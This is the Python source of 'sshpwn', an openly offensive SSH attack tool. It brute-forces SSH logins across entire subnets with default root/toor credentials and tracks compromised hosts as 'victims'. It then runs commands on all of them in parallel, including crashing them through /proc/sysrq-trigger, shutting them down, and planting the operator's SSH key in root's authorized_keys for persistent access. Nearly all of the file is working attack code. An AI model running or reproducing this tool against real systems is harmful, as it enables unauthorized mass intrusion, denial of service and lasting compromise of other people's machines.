#!/usr/bin/python3

# sshpwn v1.6

# Copyright (c) 2016 Shawn Pang
# http://shawnpang.com
# Released under the MIT license

import sys, os, time, threading
import misc.coloredstatus as cs
from queue import Queue
from pwn import *
from payloads.fun import *
from payloads.dump import *
from payloads.persistence import *

def consolidatevictims(victims):
    
    if len(victims) == 0:
        print(cs.error, "Unable to connect to any user!")
        return 1

    print()
    for victim in victims:
        print(cs.good, "Connected to", victim.user + " at " + victim.host)
    print(cs.status, "Total connected users:", len(victims))
    return 0

def getvictimlist(configs):

    mode = input("\n" + cs.status + " Enter 's' for single-user mode, 'm' for multi-user mode, 'b' for brute force mode: ")
    victims = []
    
    if mode == 's':
        RUSER = input(cs.status + " Enter remote user: ")
        RHOST = input(cs.status + " Enter remote host: ")
        try:
            victims.append(ssh(user=RUSER, host=RHOST, keyfile=configs["KeyFile"]))
            return victims
        except:
            return None

    elif mode == 'm':
        def threader():
            while True:
                ip = q.get()
                multiuser(ip[0], ip[1])
                q.task_done()
        
        def multiuser(login, ip):
            try:
                s = ssh(user=login, host=ip, keyfile=configs["KeyFile"], password=password, timeout=2)
                victims.append(s)
            except:
                pass
        
        print(cs.status, "Using", configs["HostFileForMultiUser"], "file")
        victimlist = list(entry.strip().split(" ") for entry in open(configs["HostFileForMultiUser"], "r") if entry.strip())

        # Configurations
        password = input(cs.status + " Enter password to use (none): ")
        password = "toor" if not password else password
        
        threads = input(cs.status + " Enter number of threads to use (256): ")
        threads = 256 if not threads else int(threads)
        
        # Variables
        q = Queue()

        # Threading
        start = time.time()

        print(cs.status, "Prepping targets...")
        for workers in range(threads):
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()

        print(cs.status, "Multi-user mode starting...")
        for victimentry in victimlist:
            q.put(victimentry)

        q.join()
        print(cs.status, "Multi-user mode time taken: ", '{:.2f}'.format(time.time() - start), "seconds")
        # Threading End

        # Consolidate Victims 
        consolidateresult = consolidatevictims(victims)
        if consolidateresult == 1:
            return None
        else:
            return victims

    elif mode == 'b':
        def threader():
            while True:
                ip = q.get()
                bruteforce(ip)
                q.task_done()
        
        def bruteforce(ip):
            try:
                s = ssh(user=login, host=ip, password=password, timeout=2)
                victims.append(s)
            except:
                pass

        # Configurations
        login = input(cs.status + " Enter username to use (root): ")
        login = "root" if not login else login

        password = input(cs.status + " Enter password to use (toor): ")
        password = "toor" if not password else password

        subnets = input(cs.status + " Enter subnets: (192.168.1) (comma seperate multiple) (dash for range): ")
        subnets = "192.168.1" if not subnets else subnets
        # Check if a range was entered
        subnets = list(subnet.strip() + "." for subnet in subnets.split(","))
        subnetrange = len(subnets) == 1 and "-" in subnets[0]
        if subnetrange:
            octets = subnets[0].split(".")
            firstoctet = octets[0]
            secondoctet = octets[1]
            lastoctet = octets[2]
            lastoctetrange = lastoctet.split("-")
            if len(lastoctetrange) != 2:
                print(cs.error, "Invalid subnet range! Usage: 192.168.6-20")
                return None
            rangestart = int(lastoctetrange[0])
            rangeend = int(lastoctetrange[1]) + 1
        
        threads = input(cs.status + " Enter number of threads to use (256): ")
        threads = 256 if not threads else int(threads)

        # Variables
        q = Queue()
        # print_lock = threading.Lock()

        # Threading
        start = time.time()

        print(cs.status, "Prepping targets...")
        for workers in range(threads):
            t = threading.Thread(target=threader)
            t.daemon = True
            t.start()

        print(cs.status, "Brute force starting...")
        
        # Class B Entire Network
        if subnets[0].count('.') == 2:
            for subnet in subnets:
                for i in range(255):
                    for k in range(255):
                        q.put(subnet + str(i) + '.' + str(k))
        
        # Class B Network Range
        elif subnetrange:
            for i in range(rangestart, rangeend):
                for k in range(255):
                    q.put(firstoctet + '.' + secondoctet + '.' + str(i) + '.' + str(k))
        
        # Class C Entire Network
        elif subnets[0].count('.') == 3:
            for subnet in subnets:
                for i in range(255):
                    q.put(subnet + str(i))
        
        # Class A currently not supported, too big
        else:
            print(cs.error, "Invalid ip subnet format!")
            return None

        q.join()
        print(cs.status, "Brute force time taken: ", '{:.2f}'.format(time.time() - start), "seconds")
        # Threading End

        # Consolidate Victims 
        consolidateresult = consolidatevictims(victims)
        if consolidateresult == 1:
            return None
        else:
            return victims

    else:
        print(cs.error, "Unknown mode '" + mode + "'")
        return None

def builtincmd(cmd, victims):
     
    def parallelssh(victims, cmd):
        hoststring = ""
        for victim in victims:
            hoststring += victim.user + "@" + victim.host + " "    
        print()
        os.system("parallel-ssh -i -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A \"" + cmd + "\"")

    def parallelscp(victims, local, remote):
        hoststring = ""
        for victim in victims:
            hoststring += victim.user + "@" + victim.host + " "    
        print()
        os.system("parallel-scp -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A " + local + " " + remote)

    if not cmd[0]:
        return 2
    elif cmd[0] == "help":
        print("Built-in commands:\nhelp, back, exit, victims, export\n")
        os.system("ls -lR payloads/ --hide=*.pyc --hide=__pycache__ --hide=__init__.py")
        return 2
    elif cmd[0] == "back":
        return 1
    elif cmd[0] == "exit" or cmd[0] == "quit":
        print("\n" + cs.status, "Exiting...")
        sys.exit(0)
    elif cmd[0] == "victims":
        consolidatevictims(victims)
        return 2
    elif cmd[0] == "export":
        def usage():
            print(cs.status, "Usage: export [format: sshpwn, iplist, both] [output w/o extension]")
        if len(cmd) != 2:
            usage()
            return 2
        params = cmd[1].split(" ")
        if len(params) != 2:
            usage()
            return 2
        elif params[0] != "sshpwn" and params[0] != "iplist" and params[0] != "both":
            print(cs.error, "Unknown format '" + params[0] + "'")
            return 2

        print("\n" + cs.status, "Exporting connected users list with '" + params[0] + "' mode...")
        if params[0] == "sshpwn":
            output = open(params[1] + ".sshpwn", 'a')
            for victim in victims:
                output.write(victim.user + " " + victim.host + "\n")
            output.close()
        elif params[0] == "iplist":
            output = open(params[1] + ".txt", 'a')
            for victim in victims:
                output.write(victim.host + "\n")
            output.close()
        elif params[0] == "both":
            output = open(params[1] + ".sshpwn", 'a')
            output2 = open(params[1] + ".txt", 'a')
            for victim in victims:
                output.write(victim.user + " " + victim.host + "\n")
                output2.write(victim.host + "\n")
            output.close()
            output2.close()
        print(cs.good, "Exported list to", params[1])
        return 2

    elif cmd[0] == "command":
        def usage():
            print(cs.status, "Usage: command [command]")
        if len(cmd) < 2:
            usage()
            return 2

        parallelssh(victims, cmd[1])
        return 2

    elif cmd[0] == "copy":
        def usage():
            print(cs.status, "Usage: copy [local] [remote]")
        if len(cmd) < 2:
            usage()
            return 2
        directories = cmd[1].split(" ")
        if len(directories) != 2:
            usage()
            return 2

        parallelscp(victims, directories[0], directories[1])
        return 2

    elif cmd[0] == "freeze":
        parallelssh(victims, "echo c > /proc/sysrq-trigger")
        return 2 

    elif cmd[0] == "shutdown":
        parallelssh(victims, "init 0")
        return 2 

    elif cmd[0] == "injectkeys":
        parallelssh(victims, "mkdir -p /root/.ssh")
        parallelscp(victims, "/home/optixal/.ssh/id_rsa.pub", "/root/.ssh/authorized_keys")
        parallelssh(victims, "service sshd reload")
        return 2 

def execute(cmd, victim, configs):
    try:
        result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
    except NameError:
        print(cs.error, "Payload not found!")
        return 1

    if result == 0:
        print(cs.special, "Payload successful on", victim.host)
        return 0
    elif result == 1:
        return 1
    else:
        print(cs.error, "Payload failed on", victim.host)
        return 2

def main():

    with log.progress("Loading config file...") as p:
        configs = dict(config.strip().split(" ") for config in open("config", "r") if config.strip())
        p.status("")

    try:
        while True:
            victims = getvictimlist(configs)
            if not victims:
                continue

            while True:
                sshpwncmd = input("\n" + cs.command + " sshpwn > ")
                sshpwntokens = sshpwncmd.split(" ", 1)

                builtincmdcode = builtincmd(sshpwntokens, victims)
                if builtincmdcode == 1:
                    break
                elif builtincmdcode == 2:
                    continue
            
                for victim in victims:
                    exitcode = execute(sshpwntokens, victim, configs)
                    if exitcode == 1:
                        break
                    elif exitcode == 2:
                        continue    

    except KeyboardInterrupt:
        print("\n" + cs.status, "Exiting...")

if __name__ == "__main__":
    main()
